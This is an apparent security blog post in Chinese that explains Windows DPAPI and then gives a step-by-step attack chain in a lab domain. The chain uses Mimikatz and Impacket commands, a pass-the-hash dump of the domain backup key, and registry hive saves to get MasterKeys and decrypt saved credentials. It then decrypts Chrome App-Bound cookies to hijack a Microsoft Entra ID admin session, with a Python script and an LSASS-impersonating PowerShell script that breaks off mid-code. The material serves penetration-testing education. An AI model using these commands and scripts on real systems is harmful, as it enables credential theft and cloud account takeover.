# From DPAPI to Chrome - A Journey to Entra ID Takeover-先知社区

> **来源**: https://xz.aliyun.com/news/19124  
> **文章ID**: 19124

---

# Overview

随着多因素认证（MFA）的广泛部署，从浏览器中窃取用户密码的利用价值降低，越来越多的攻击者开始转向窃取浏览器 Cookie 作为突破口。然而现代浏览器如 Chrome 和 Edge 大都采用了 Windows 内置的 DPAPI 数据保护机制来加密这些敏感数据。

在本文中，我们将深入探索 DPAPI 的概念和工作原理，解析它如何保护浏览器中的密码和 Cookie，并通过详细的步骤演示攻击者如何在建立立足点后，通过离线提取 MasterKey、破解 Chrome 最新的 App Bound 加密保护，最终成功解密 Cookie 并接管云服务会话的完整攻击链路。

# What is DPAPI

Data Protection API (DPAPI) 全称 Data Protection Application Programming Interface，是 Microsoft 从 Windows 2000 开始随操作系统一起提供的一种数据保护应用程序编程接口，用于向用户和系统进程提供操作系统级数据保护服务。

在几乎所有的加密系统中，最困难的挑战之一就是密钥管理 —— 其中一部分难点在于如何安全地存储解密密钥。如果密钥以明文存储那么任何能够访问该密钥的用户都能访问被加密的数据。如果要对密钥进行加密，则又需要另一个密钥，周而复始。

在 Windows 操作系统中，DPAPI 主要用于对非对称私钥执行对称加密，使用用户或系统的机密信息（Secret）作为重要熵（Entropy）源。DPAPI 这种方式简化了开发者的加密工作：开发者可使用从用户登录凭据派生的密钥进行加密，或在系统加密场景下使用系统的域认证机密，从而无需自行管理加密密钥的保护。

最常见的 DPAPI 调用为 `CryptProtectData` 和 `CryptUnprotectData` 两个函数，应用程序可以通过它们以当前登录会话的上下文分别对数据进行加密与解密。这意味着被加密的数据只能由与加密时相同的用户或系统解密。此外，为了防止其他人查看进程中的敏感信息，微软还提供了`CryptProtectMemory` 和 `CryptUnprotectMemory` 函数，支持对内存进行加密与解密。

此外，这些函数还接受一个 `entropy` 参数，该参数在加密与解密时都会参与运算。因此，要解密使用该 `entropy` 加密的数据，必须提供与加密时相同的 `entropy` 值。

# Why Attack DPAPI

在实际渗透测试与进攻性网络行动中，针对 Windows DPAPI 的利用具有极高的战术价值。由于 DPAPI 被 Windows 系统广泛用于保护敏感数据，例如凭据管理器（Credential Manager）中的保存的用户凭据、浏览器中保存的密码与 Cookie 等，成功提取并解密 MasterKey 可以使攻击者直接访问这些关键数据，从而绕过复杂的认证机制。

尤其在混合云（如 Microsoft 365、Azure AD/Entra ID、Slack 等）广泛部署和普遍启用 MFA 的当下，窃取浏览器 Cookie 成为绕过多因素认证，并直接以受害者身份访问资源（如 Exchange Online、OneDrive、SharePoint、Microsoft Teams 等）的高效手段：用户已在应用中完成认证，攻击者只需复用会话 Cookie 即可直接访问其云上资源，无需再次进行交互式登录或多因素认证。

此外，通过 DPAPI 攻击获取敏感数据，不仅为攻击者提供了向云资产横向移动的路径，也使其能够在无需持久控制受害主机的情况下，持续访问各类高价值云服务，极大扩展了攻击的纵深和影响范围。

# Concepts of DPAPI

DPAPI 专注于为用户提供数据保护。由于 DPAPI 需要一个密码来提供保护，因此逻辑上的步骤就是让 DPAPI 使用用户的“登录密码”，它确实这样做了，不过方式稍有不同。DPAPI 实际上使用的是用户的“登录凭据”。在一个典型的系统中，如果用户是用密码登录的，那么它的“登录凭据”就只是用户密码的哈希。然而在用户使用智能卡登录的系统中，这个“凭据”就会不同。为了简化，我们使用“用户密码”、“登录密码”或者简单称为“密码”来指代这个“凭据”。

## Keys, Passwords and Blob in DPAPI

### Secondary Entropy

使用“登录密码”的一个小缺点是，同一用户下运行的所有应用程序都可以访问它们知道存在的任何被保护的数据。当然，因为应用程序必须存储它们自己的被保护数据，其他应用程序获取这些数据可能会有些困难，但绝不是不可能。为了抵消这一点，DPAPI 允许应用程序在保护数据时使用一个额外的 “secret”。这个额外的 “secret” 在解密数据时同样是必须的。

从技术上讲，这个 “secret” 应该被称为“二次熵”（Secondary Entropy）。它之所以是“二次”，是因为它并没有增强用于加密数据的密钥，但确实增加了难度，让在同一用户下运行的某个应用更难以破解另一个应用的加密密钥。应用程序在使用和存储这种 entropy 时应该非常小心。如果它只是以未受保护的方式保存到文件中，那么攻击者可能会访问到这个 entropy 并用它来解密应用程序的数据。

### DPAPI Key

用户使用 DPAPI 加密数据时，DPAPI 会生成一个称为 “MasterKey” 强密钥，它基于用户的密码进行保护。狭义上，我们可以认为 Master Key 是 DPAPI 中用于加密或解密数据时使用的主密钥，其通常为 64 字节的随机数据。每个 MasterKey 都会分配一个 GUID 来标识它。

DPAPI 使用一种称为“基于密码的密钥派生”（Password-Based Key Derivation，在 PKCS #5 中有描述）的标准加密过程，来基于用户的密码和其他因素为每个用户派生一个唯一的密钥（称为 Password-derived Key，密码派生密钥）。然后，这个 Password-derived Key 会与 Triple-DES 算法一起使用来加密 MasterKey，最后作为 Master Key file 被存储在用户的配置文件目录中。

#### User-level DPAPI Key

用户级别的 DPAPI 密钥是用户对数据进行加密的密钥，通常用来保护用户级别的数据。前面我们描述的就是用户级别的 DPAPI 密钥的派生过程。

对于用户来说，其 Master Key file 位于 `%APPDATA%MicrosoftProtect<sid>` 目录下，其中 {SID} 是该用户的 Security Identifier。

![image-20250928185115272.png](images/img_19124_000.png)

> 由于该目录下的相关文件被作为系统文件永久隐藏，因此需要通过 Powershell 的 `Get-ChildItem -Hidden` 或 `dir /a`  命令来列出。

#### Machine/System-level DPAPI Key

机器/系统级别的 DPAPI 密钥是机器对数据进行加密的密钥，通常用来加密需要被系统自身访问的数据，例如机器级凭据或系统范围的机密。与用户级别的 DPAPI 密钥不同的是，它基于 DPAPI\_SYSTEM 密钥。

DPAPI\_SYSTEM 是一个只有 SYSTEM 用户才能访问的特殊密钥，存放于 LSA 机密或 `HKEY_LOCAL_MACHINESECURITYPolicySecretsDPAPI_SYSTEM` 注册表中。其包含两个密钥，分别称为机器密钥（Machine Key）和用户密钥（User Key），后者一般用来加密机器/系统级别的 Master Key。

对于机器/系统里说，其 Master Key file 位于在 `%WINDIR%System32MicrosoftProtectS-1-5-18User` 目录下。

![image-20250928185446738.png](images/img_19124_001.png)

> 由于该目录下的相关文件被作为系统文件永久隐藏，因此需要通过 Powershell 的 `Get-ChildItem -Hidden` 或 `dir /a`  命令来列出。

### DPAPI Blob

出于安全原因，MasterKey 会过期，这意味着在一段时间之后（硬编码的值是 3 个月），会生成一个新的 MasterKey 并以相同方式进行保护。并且，DPAPI 不会删除任何过期的 MasterKeys，它们会永久保存在用户的配置文件目录中，并由用户的密码保护。这种过期机制可以防止攻击者通过攻破一个单一的 MasterKey 来访问用户的所有受保护数据。

那么，一个应用程序如何了解该使用哪个 MasterKey 来解密自己受保护的数据的呢？或者，一个应用程序如何解密使用已过期 MasterKey 保护的数据的呢？

这里我们要了解，DPAPI 会以“不透明“的 Data BLOB 形式返回受保护的数据，其头部便存储了用于保护数据的 MasterKey 的 GUID。当 Data BLOB 被传回 DPAPI 时，会使用与 GUID 对应的 MasterKey 来解密数据。此外，DPAPI Data blob 都以 `01 00 00 00` 开头。

### Session Key

狭义上，我们可以认为 MasterKey 就是真正用于加密/解密数据的密钥。然而，事实上 MasterKey 并不会被直接用于保护数据。相反，会基于 MasterKey、一些随机数据，以及任何额外的 entropy（如果应用程序选择提供的话）来生成一个对称的“会话密钥”（Session Key）。真正用于保护数据的就是这个 Session Key。

与 MasterKey 不同的是，Session Key 并不会被存储。相反，DPAPI 会将用于生成该 Session Key 的随机数据存储在”不透明“的 Data BLOB 中。当 Data BLOB 再次传递给 DPAPI 时，这些随机数据会被用来重新生成 Session Key 并解密数据。

## Key Backup and Restoration in DPAPI

当一台计算机加入域时，DPAPI 提供了一种备份机制来确保数据仍然可以被解密。生成 MasterKey 时，DPAPI 会与域控制器通信。域控制器拥有一个专门为 DPAPI 使用的全域范围的公钥/私钥对，这个密钥被称作“域备份密钥”（Domain Backup Key）。本地的 DPAPI 客户端会通过一个经过双向认证并受保护的 RPC 调用，从域控制器获取公钥。客户端使用域控制器的公钥加密 MasterKey，并将这个备份 MasterKey 与基于用户密码保护的 MasterKey 一起存储。

在解密数据时，如果 DPAPI 无法使用由用户密码保护的 MasterKey，它会通过同样的双向认证且受保护的 RPC 调用，将备份的 MasterKey 发送到域控制器。域控制器使用它的私钥解密该 MasterKey，然后再通过同样受保护的 RPC 调用将其返回给客户端。

需要注意的是，用于加密 MasterKey 的域备份密钥始终存储在域控制器中，并且永远不会改变。因此，如果攻击者获取了域控制器的访问权限，就可以提取出域的备份密钥，并解密域内所有用户的 MasterKey。

# Master Key file Analysis

至此，我们已经理解了 DPAPI 的大部分核心概念，并且明确了它会生成一个称为 “MasterKey” 的强密钥，该密钥会基于用户密码或 DPAPI\_SYSTEM 进行加密后存储在 Master Key file 中。至于 Master Key file 的具体结构解析，我们可以参考这篇文章：[“Extracting DPAPI MasterKey Data”](https://medium.com/@toneillcodes/extracting-dpapi-masterkey-data-1381168ad5b8)。

# Extracting the MasterKey

## Online Extraction (not recommended)

在 MasterKey 提取方面，最经典的就是直接在目标主机上，通过已获取的本地管理员级别的权限，使用 Mimikatz 访问 LSASS 内存来提取所有已登录用户的 MasterKey：

```
privilege::debug
sekurlsa::dpapi
```

![image-20250929114003087.png](images/img_19124_002.png)

![image-20250929114422232.png](images/img_19124_003.png)

如上图所示，成功导出 4 个 MasterKey。其中，david.lewis 用户的会话中存在一个 MasterKey，计算机 账户 ITWS-DLEWIS$ 中存在 3 个 MasterKey。

现实中，可能会在一个用户的会话中导出多个 MasterKey，而具体使用哪个 MasterKey 来进行后续的解密还取决于目标 Data blob 中记录的 MasterKey 的 GUID。只有当 MasterKey 的 GUID 与 blob 中指示的 GUID 匹配时，才可用该 MasterKey 成功解密相应的数据。

然而，这种简单粗暴的攻击方式存在一定局限，因为它需要将 Mimikatz 等工具直接上传至目标计算机。考虑到目标机上可能部署了各种杀软或 EDR 等防护机制，就必须借助相应的规避手段。

## Offline Extraction

离线提取 MasterKey 需要将目标用户的 Master Key file 拷贝到本地，并适用于已知目标用户的登录密码/凭据和 SID，或已经转储域备份密钥的情况。

### Using User Password/Credentials

该方式需要已经将需要解密的 Master Key file 拷贝到本地，并且已经知晓了目标用户的登录密码和 SID，则可以在任何一台计算机上通使用 Mimikatz 的以下命令解密出 MasterKey：

```
dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /sid:"<USER_SID>" /password:"<USER_PASSWORD>" /protected
```

![image-20250929122100356.png](images/img_19124_004.png)

如果是目标用户为域用户，也可以使用其密码的哈希值进行解密：

```
dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /sid:"<USER_SID>" /hash:"<USER_NTLM_HASH>" /protected
```

![image-20250929122525849.png](images/img_19124_005.png)

此外，也可以通过 Impacket 套件中的 dpapi.py 脚本进行解密：

```
# 通过已知的密码解密 MasterKey
impacket-dpapi masterkey -file '<Path to MASTER_KEY_FILE>' -sid '<USER_SID>' -password '<USER_PASSWORD>'
```

![Snipaste_2025-09-29_00-40-26-9121059.png](images/img_19124_006.png)

### Using Domain Backup Key

该方式需要已经将需要解密的 Master Key file 拷贝到本地，并且已经从域控制器中转储域备份密钥，则可以在任何一台计算机上恢复域内任意用户的 MasterKey。

我们可以通过已获取的域管理员级别的权限，使用 Mimikatz 的以下命令从域控制器中转储域备份密钥。但是，在真实渗透行动中，往往无法直接获取域管理员的明文密码。此外，为了避免将工具直接上传到目标主机，我们需要先在本地执行哈希传递，之后在域管理员的上下文中执行转储操作。

```
lsadump::backupkeys /system:"<Domain Controller>" /export
```

![image-20250929125856616.png](images/img_19124_007.png)

如上图所示，转储过程会生成 3 个不同后缀命名的文件，其中最重要的就是 `*.pvk` 文件。`.pvk` 扩展名也有“私钥“的意思。

然后可以通过 `*.pvk` 文件恢复目标用户的 Master Key：

```
dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /pvk:"<Path to DOMAIN_BACKUP_KEY_EXPORT_PVK_FILE>"
```

![image-20250929130144766.png](images/img_19124_008.png)

![image-20250929130228571.png](images/img_19124_009.png)

此外，也可以通过 Impacket 套件中的 dpapi.py 脚本进行操作：

```
# 远程转储域备份密钥
impacket-dpapi backupkeys -t offseclabs.tech/Administrator@srvad01.offseclabs.tech -hashes :570a9a65db8fba761c1008a51d4c95ab -dc-ip 10.10.10.11 --export
# 通过域备份密钥恢复 MasterKey
impacket-dpapi masterkey -file '<Path to MASTER_KEY_FILE>' -pvk '<Path to DOMAIN_BACKUP_KEY_EXPORT_PVK_FILE>'
```

![image-20250929131107931.png](images/img_19124_010.png)

# Decrypt DPAPI-protected Data

一旦成功获取并解密用户的 MasterKey，攻击者就能解锁该 MasterKey 下所有受 DPAPI 保护数据的访问，典型目标包括凭据管理器中的用户凭据和浏览器保存的密码与 Cookie。

## Decrypting Credential Manager Vault

Windows 凭据管理器（Credential Manager）是操作系统提供的一个安全存储机制，用于保存用户的账户凭据，例如网站密码、域账户、应用程序登录信息等。这些凭据数据统一保存在 Credential Manager Vault（凭据保管库） 中，而 Vault 的底层存储位置主要位于本地 `%USERPROFILE%AppDataLocalMicrosoftCredentials` 目录，该目录下的凭据文件同样被作为系统文件永久隐藏。

最重要的是，凭据文件由 Vault 系统统一管理，这些凭据的核心机密部分并不是明文存储，而是依赖 DPAPI (Data Protection API) 进行加密保护。

如下图所示，目标主机的凭据管理器中保存了 3 条凭据。为避免将工具直接上传至目标主机，应先将这些凭据文件拷贝到本地，然后使用 Mimikatz 对凭据文件中的 Data BLOB 进行解析，以提取加密数据及其对应的 `guidMasterKey`。

```
dpapi::cred /in:".\Credentials\088E944D53AA5325DEBB316DAD22B476"
```

![image-20250929133524010.png](images/img_19124_011.png)

从返回的结果中可以看到，该凭据受到 GUID 为 {d50af38c-3c43-4c36-9a32-3dc81a133f83} 的 MasterKey 保护，正是我们前文已解密成功的那个。

接下来可以使用该 MasterKey 对存放在 `088E944D53AA5325DEBB316DAD22B476` 文件中的凭据（从解密结果中可以看出它是一个远程桌面连接保存的密码）进行解密。

```
dpapi::cred /in:".\Credentials\088E944D53AA5325DEBB316DAD22B476" /masterkey:"f7207dc067794eca1d528ce941e63fa37670566c9770c56692a04462df41ce462266eb784037d396238f5c54fc0adf586d568bd1acc827beda452220ad83883b"
```

![image-20250929133941577.png](images/img_19124_012.png)

## Decrypting Browser Cookies

所有基于 Chromium 内核的浏览器，其 Cookie 数据通常都存储在本地 “User Data” 目录下的 `Cookies` 数据库中，并默认受到 DPAPI 的加密保护。本文将以 Chrome 浏览器为例，详细剖析其解密过程并进行演示。

### Old Decryption Primitive

在 Google Chrome 127 版本之前，想要从 Chrome 浏览器中提取并解密 Cookies 相对容易，因为其存储遵循固定流程：所有的 Cookies 数据以 AES 加密后保存在位于 `%LocalAppData%GoogleChromeUser DataDefaultNetworkCookies` 的SQLite 数据库文件中，而用于 AES 加密的密钥被 Chrome 生成并经过当前用户的 DPAPI MasterKey 保护后，以 Base64 编码形式存放在 JSON 格式的 `%LocalAppData%GoogleChromeUser DataLocal State` 文件的 `os_crypt.encrypted_key` 字段内。

因此，要从 Chrome 中解密 Cookies，可以按以下流程操作：

* 定位目标用户的 Cookies 和 Local State 文件，并将其拷贝到本地。
* 从 Local State 中读取 `os_crypt.encrypted_key` 的值，并对其做 Base64 解码后保存到文件中，得到一个被 DPAPI 保护的 Data BLOB。
* 使用 Mimikatz 解析该 Data BLOB，找出保护它的用户 MasterKey，并用该 MasterKey 解密 BLOB，从而恢复出用于 AES 加密的明文密钥。
* 用得到的 “encrypted\_key” 明文密钥去解密 SQLite 数据库中存储的 Cookies，恢复出可读的 Cookie 值。

### App-Bound Decryption Primitive

在 Chrome 127 版本发布之后，所有存储在 Cookies 数据库中的加密 Cookie 值开头标识由原来的 `v10` 更新为 `v20`，这标志着加密机制发生了重要变化。Google 开发团队在 Chrome 浏览器中引入了一种新的保护机制，它相较于传统的 DPAPI 进行了改进，提供了基于应用绑定的加密原语（App-Bound Encryption）。与过去任何以登录用户身份运行的应用都能访问这些数据不同，现在 Chrome 可以将数据加密与应用身份绑定在一起，这与 macOS 上的 Keychain 工作方式类似。

![img](/Users/whoami/wh0amitz.github.io/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/Screenshot 2024-07-26 2.15.06 PM.png)App‑Bound 加密依赖一个特权服务来验证发起请求的应用程序身份。在加密时，App‑Bound 加密服务会将应用的身份编码进加密数据中，并在尝试解密时验证该身份的有效性。如果系统上的另一个应用尝试解密同一份数据，解密将会失败。由于 App‑Bound 服务以系统权限运行，攻击者不能仅仅通过诱导用户运行恶意程序来获得数据访问权，他们现在必须获得系统级权限，或注入 Chrome 注入进程。

在启用 App-Bound 保护后，Local State 文件仍然包含用于解密所有 Cookie 值的密钥，虽然 `os_crypt.encrypted_key` 字段仍保留，但这次 AES 密钥（后续我们称作 “App-Bound Key“）经过保护后被保存在 `os_crypt.app_bound_encrypted_key` 字段中。此外，区别于之前 AES 密钥的单次 DPAPI 保护方式，这次使用了 3 轮保护：

1. 首先，对 “App-Bound Key“ 进行了一次加密保护；
2. 之后，使用用户的 MasterKey 进行一次 DPAPI 保护；
3. 最后，使用机器/系统的 MasterKey 再进行一次 DPAPI 保护。

然而，自 Google Chrome 127 版本发布以来，针对这个 “App-Bound Key“ 的第一轮加密保护算法至少变更了三次。

* 在 Google Chrome 133 版本之前，通过硬编码在 “elevation\_service.exe” 中的密钥使用 AES-256-GCM 算法进行加密。
* 在 Google Chrome 133 版本发布后，将加密算法更改为了 ChaCha20\_Poly1305，但加密使用的密钥仍然硬编码在 “elevation\_service.exe” 中。
* 在 Google Chrome 137 之后，加密算法又恢复为 AES‑256‑GCM。同时，用于 AES‑256‑GCM 的对称密钥不再硬编码在 “elevation\_service.exe” 中，而是作为一个随机生成的 `aes_key` 被附加到 “App‑Bound Key” 中。该 `aes_key` 会先与 “elevation\_service.exe” 中硬编码的静态常量做一次 XOR 混淆，然后通过 Cryptography API: Next Generation (CNG) 对其进行加密。最终，经过加密的 `aes_key` 与加密后的 “App‑Bound Key” 一并存储，随后一起接受后续的两轮 DPAPI 保护。

由此可见，Chrome 在多次更新后，对其 AES 密钥的保护机制发生了显著变化，使得攻击者窃取 Cookie 的难度大幅增加。与此同时，手动提取 Cookie 的流程变得更加复杂，且无法完全离线完成。下面，我们列出了在 Chrome 采用 App‑Bound 保护并使用最新加密保护链路的情况下，从浏览器中手动解密 Cookie 的逐步流程。

1. 定位目标用户的 Cookies 和 Local State 文件，并将其拷贝到本地。
2. 从 Local State 中读取 `os_crypt.app_bound_encrypted_key` 的值，并对其做 Base64 解码后保存到文件中，得到一个被 DPAPI 保护的 Data BLOB。
3. 使用 Mimikatz 解析该 Data BLOB，找出保护它的机器/系统 MasterKey，并用该 MasterKey 解密 BLOB。解密得到的数据我们称作 Decrypted\_Blob\_1。
4. 继续使用 Mimikatz 解析该 Decrypted\_Blob\_1，找出保护它的用户 MasterKey，并用该 MasterKey 解密 Decrypted\_Blob\_1。解密得到的数据我们称作 Decrypted\_Blob\_2。
5. 从 Decrypted\_Blob\_2 中根据字节偏移量分别提取出 ENCRYPTED\_AES\_KEY、VI、CIPHERTEXT 和 TAG：

* ENCRYPTED\_AES\_KEY，经过 XOR 混淆和 CNG 加密后的 `aes_key` 密文，长度为 32 字节，解密后将产生用于解密 CIPHERTEXT 部分的密钥。
* VI：用于 AES‑256‑GCM 的初始化向量（nonce），长度为 12 字节。
* CIPHERTEXT：经过 AES-256-GCM 加密后的 “App‑Bound Key” 密文，长度为 32 字节，解密后将产生真正用于解密 Cookies 的明文密钥。
* TAG：GCM 消息认证标签，长度为 16 字节，用于验证密文的完整性和真实性。

1. 在目标主机上模拟 LSASS 进程，调用 CNG API 对 ENCRYPTED\_AES\_KEY 部分进行解密，并将解密后的结果与 “elevation\_service.exe” 中硬编码的静态常量做一次 XOR 混淆，得到 `aes_key` 的明文。
2. 使用 `aes_key` 值作为 `AES-256-GCM` 的密钥，对 CIPHERTEXT 部分进行解密，得到真正用于解密 Cookies 的密钥。
3. 最终得到的这个密钥可以用老版本的方案去正常解密 Cookies 内容。

### Case Study

接下来，我们通过一个具体场景对 “App-Bound Decryption Primitive” 部分所述的解密流程进行演示。

假设当前已在 OffsecLabs 这个实验室的网络中建立了立足点，现在需要横向至该组织使用的 Microsoft Entra ID。已知以下条件：

* 已经接管了 OffsecLabs 这个实验室的域控制器权限。
* 已经转储了域备份密钥。
* 域用户 “offseclabsdavid.lewis” 近期在 “ITWS-DLEWIS” 主机上以全局管理员身份登录过 Microsoft Entra ID，且有可能仍处于活动会话（用户可能在登录时确认了“保持登录状态”的提示）。
* “ITWS-DLEWIS” 主机上的 Chrome 浏览器版本为 “140.0.7339.208 (Official Build) (64-bit)”，该版本启用了 App-Bound 保护。

在确认以上前提后，下面按步骤开始实际操作：

（1）首先，“ITWS-DLEWIS” 主机上将 “offseclabsdavid.lewis” 用户所属的 Cookies 和 Local State 文件拷贝到本地，并通过以下 Python 脚本，将 Local State 文件 `os_crypt.app_bound_encrypted_key` 值以 BLOB 的格式提取到 “app\_bound\_encrypted\_key.bin” 文件中：

```
import binascii
import json

# Load local state file
with open("local state", "r") as f:
    local_state = json.load(f)

# Extract the app-bound encrypted key
app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

# Ensure it starts with "APPB"
assert binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB"

# Strip the "APPB" header and convert to Base64
app_bound_encrypted_key_b64 = binascii.b2a_base64(
    binascii.a2b_base64(app_bound_encrypted_key)[4:]
).decode().strip()

# Print the key in hex format
print(binascii.a2b_base64(app_bound_encrypted_key)[4:].hex())

# Convert hex to bytes
byte_data = bytes.fromhex(
    binascii.a2b_base64(app_bound_encrypted_key)[4:].hex()
)

# Write to file
with open("app_bound_encrypted_key.bin", "wb") as w:
    w.write(byte_data)
```

（2）使用 Mimikatz 对 “app\_bound\_encrypted\_key.bin” 中的 Data BLOB 进行解析，找出保护它的机器/系统 MasterKey 的 GUID：

```
dpapi::blob /in:".\app_bound_encrypted_key.bin"
```

![image-20250929195549876.png](images/img_19124_013.png)

从返回的结果中可以看到，该 Data BLOB 受到 GUID 为 {bc01a1a5-999c-4652-bc65-9e3c79ebcce5} 的机器/系统 MasterKey 保护，接下来需要解密这个机器/系统 MasterKey。

（3）由于机器/系统级别的 MasterKey 密钥基于 DPAPI\_SYSTEM 密钥进行加密，而 DPAPI\_SYSTEM 存放于 LSA 机密或 `HKEY_LOCAL_MACHINESECURITYPolicySecretsDPAPI_SYSTEM` 注册表中。因此最近简单的方法通过转储注册表来获取 DPAPI\_SYSTEM 密钥。

```
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY
```

将转储的 SYSTEM 和 SECURITY 文件拷贝到本地，通过 Mimikatz 进行解析得到 DPAPI\_SYSTEM 值。

```
lsadump::secrets /system:SYSTEM /security:SECURITY
```

![image-20250929194411597.png](images/img_19124_014.png)

上图中可以看到，DPAPI\_SYSTEM 值（full）包含两部分，前半段 “1e6ea4d324c446648c024c4ad301049628bccf60” 被称为机器密钥（Machine Key），后半段 “b08b821574f1020edbc98883ba3ddf012714ed66” 被称为用户密钥（User Key），后者一般用来加密机器/系统的 Master Key。

（4）在 `%APPDATA%MicrosoftProtect<sid>` 目录下找到与 {bc01a1a5-999c-4652-bc65-9e3c79ebcce5} 对应的 Master Key file，并拷贝到本地，通过 Mimikatz 进行解密。

```
dpapi::masterkey /in:"bc01a1a5-999c-4652-bc65-9e3c79ebcce5" /system:"1e6ea4d324c446648c024c4ad301049628bccf60b08b821574f1020edbc98883ba3ddf012714ed66" /protected
```

![image-20250929195241887.png](images/img_19124_015.png)

（5）通过得到的机器/系统 MasterKey 解密 “app\_bound\_encrypted\_key.bin” 中的 Data BLOB。

```
dpapi::blob /in:".\app_bound_encrypted_key.bin" /masterkey:"9d9a733d63da3b0759c15a6c70bdad83fd39a333238399acbbda2963049a971931f2b6e25df0c1288e3ef0d5cc1195712421134d66d043b937c8de867938fc66"
```

![image-20250929195925370.png](images/img_19124_016.png)

如上图所示，返回结果中的 `data` 部分就是第一次解密得到的数据，我们将其以 BLOB 的格式提取到 “decrypted\_blob\_1.bin” 文件中。

（6）之后，我们需要使用 “offseclabsdavid.lewis” 用户的 MasterKey 对 “decrypted\_blob\_1.bin” 中的数据进行二次解密。

```
dpapi::blob /in:".\decrypted_blob_1.bin" /masterkey:"f7207dc067794eca1d528ce941e63fa37670566c9770c56692a04462df41ce462266eb784037d396238f5c54fc0adf586d568bd1acc827beda452220ad83883b"
```

> 这里省去了分析 “decrypted\_blob\_1.txt” 的过程，因为该用户只有这一个 MasterKey，并在前文中我们已掌握。

![image-20250929202158541.png](images/img_19124_017.png)

如上图所示，返回结果中的 `data` 部分就是第二次解密得到的数据。我们可以将其转换为 Hexdump 的格式：

```
00000000  1f 00 00 00 02 43 3a 5c 50 72 6f 67 72 61 6d 20  |.....C:\Program |
00000010  46 69 6c 65 73 5c 47 6f 6f 67 6c 65 5c 43 68 72  |Files\Google\Chr|
00000020  6f 6d 65 5d 00 00 00 03 34 d7 b9 27 48 af 91 d1  |ome]....4×¹'H¯.Ñ|
00000030  ad 92 0b bf 91 79 09 4d 40 f2 af 73 ec fc 23 71  |...¿.y.M@ò¯sìü#q|
00000040  6f 08 0d a2 13 e3 e4 3d 39 7e 15 a3 7a 6d bb cf  |o..¢.ãä=9~.£zm»Ï|
00000050  ee 2f 05 db 88 b6 48 b6 9c d8 4b 04 50 82 49 38  |î/.Û.¶H¶.ØK.P.I8|
00000060  eb bc 8c 16 3b 38 89 bd 7f 44 24 aa c2 50 e8 f7  |ë¼..;8.½.D$ªÂPè÷|
00000070  8c 65 fd 7b c8 34 81 cc 61 71 1b ee 16 cc a9 c4  |.eý{È4.Ìaq.î.Ì©Ä|
00000080  09 bf 6f 73                                      |.¿os|
```

可以看到，经过两次 DPAPI 解密后，结果中首先出现 Chrome 的安装路径；然后跳过 `00 00 00 03` 标记开始，接下来的 92 个字节按顺序分别对应前文中提到的 ENCRYPTED\_AES\_KEY、IV、CIPHERTEXT 和 TAG：

```
// ENCRYPTED_AES_KEY (32 bytes)
34 d7 b9 27 48 af 91 d1 ad 92 0b bf 91 79 09 4d 40 f2 af 73 ec fc 23 71 6f 08 0d a2 13 e3 e4 3d
// IV (12 bytes)
39 7e 15 a3 7a 6d bb cf ee 2f 05 db
// CIPHERTEXT (32 bytes)
88 b6 48 b6 9c d8 4b 04 50 82 49 38 eb bc 8c 16 3b 38 89 bd 7f 44 24 aa c2 50 e8 f7 8c 65 fd 7b
// TAG (16 bytes)
c8 34 81 cc 61 71 1b ee 16 cc a9 c4 09 bf 6f 73
```

> 这里为什么要关注 `00 00 00 03` 标记呢，因为它明确指示了 Chrome 使用何种算法对其 “App-Bound Key” 进行加密保护。不同标记对应的加密方案如下：
>
> * `00 00 00 01`：使用 AES-256-GCM 算法，密钥硬编码在 “elevation\_service.exe” 中。
> * `00 00 00 02`：使用 ChaCha20\_Poly1305 算法，密钥硬编码在 “elevation\_service.exe” 中。
> * `00 00 00 03`：使用 AES‑256‑GCM 算法，随机生成 `aes_key` 值作为密钥，并通过 CNG 对其进行保护。

（7）编写以下 PowerShell 脚本，在目标主机上模拟 LSASS 进程的令牌，调用 CNG API 对 ENCRYPTED\_AES\_KEY 部分进行解密。然后，将解密后的结果与 “elevation\_service.exe” 中硬编码的静态常量做一次 XOR 运算，得到 `aes_key` 的明文。

* Decrypt-ChromeCngEncryptedAesKey.ps1

```
# Decrypt-ChromeCngEncryptedAesKey.ps1
# Chrome AES Key Decryption via CNG with XOR Finalization

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

public class SecurityInterop {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr TokenHandle);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("ncrypt.dll")]
    public static extern int NCryptOpenStorageProvider(out IntPtr hProvider, [MarshalAs(UnmanagedType.LPWStr)] string pszProviderName, uint dwFlags);
    
    [DllImport("ncrypt.dll")]
    public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr hKey, [MarshalAs(UnmanagedType.LPWStr)] string pszKeyName, uint dwLegacyKeySpec, uint dwFlags);
    
    [DllImport("ncrypt.dll")]
    public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    
    [DllImport("ncrypt.dll")]
    public static extern int NCryptFreeObject(IntPtr hObject);
    
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const int SecurityImpersonation = 2;
    public const uint NCRYPT_SILENT_FLAG = 0x00000040;
    
    public static bool ImpersonateProcessToken(string processName) {
        IntPtr hToken = IntPtr.Zero, dupeToken = IntPtr.Zero;
        try {
            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0) return false;
            
            if (!OpenProcessToken(processes[0].Handle, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken)) 
                return false;
                
            if (!DuplicateToken(hToken, SecurityImpersonation, out dupeToken)) 
                return false;
                
            return ImpersonateLoggedOnUser(dupeToken);
        }
        finally {
